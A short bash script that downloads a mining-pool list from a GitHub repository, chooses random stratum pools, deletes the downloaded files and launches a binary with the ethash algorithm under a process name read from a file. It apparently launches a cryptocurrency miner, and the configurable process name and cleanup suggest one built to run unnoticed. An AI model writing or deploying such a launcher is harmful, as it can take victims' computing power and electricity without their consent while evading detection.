#!/bin/bash

cp ../gitpath.txt gitpath.txt
gitpathbin=$(cat gitpath.txt)

#pol conifg
wget https://raw.githubusercontent.com/$gitpathbin/main/wpoolst.txt
shuf -n 5 wpoolst.txt > wpoolst_use.txt

pool1=$(sed -n '1p' wpoolst_use.txt)
pool2=$(sed -n '3p' wpoolst_use.txt)

echo " -o stratum+http://$pool1 -o stratum+http://$pool2" > fnpool.txt
fnpool=$(cat fnpool.txt)
rm -rf wpoolst_use.txt
rm -rf wpoolst.txt
#pol conifg end

sleep 1
USEPROCNAME=$(cat SETPROCNAME.txt)

./$USEPROCNAME -a ethash $fnpool
